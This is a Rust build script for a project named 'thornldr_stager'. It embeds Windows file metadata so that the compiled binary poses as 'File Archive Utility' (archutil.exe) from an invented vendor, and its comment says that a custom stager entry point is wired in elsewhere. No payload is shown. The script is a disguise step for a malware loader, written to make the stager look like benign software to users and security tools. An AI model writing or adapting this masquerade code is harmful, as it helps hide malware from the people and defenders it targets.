// build.rs — thornldr_stager
//
// Emits a VERSIONINFO .rsrc block with plausible benign PE metadata. The
// custom entry point (`stager_entry`) is already wired via the `-e` flag
// in `.cargo/config.toml` — no custom linker script is required because
// we want ld's default PE section layout, just with our entry symbol.

fn main() {
    let target = std::env::var("TARGET").unwrap_or_default();
    if !target.contains("windows") {
        return;
    }

    let mut res = winresource::WindowsResource::new();
    res.set("FileDescription",  "File Archive Utility");
    res.set("ProductName",      "Archive Tools");
    res.set("CompanyName",      "Archive Tools Project");
    res.set("LegalCopyright",   "Copyright (C) Archive Tools Project. All rights reserved.");
    res.set("OriginalFilename", "archutil.exe");
    res.set("InternalName",     "archutil");
    res.set("FileVersion",      "3.12.4.0");
    res.set("ProductVersion",   "3.12.4.0");
    let _ = res.compile();
}
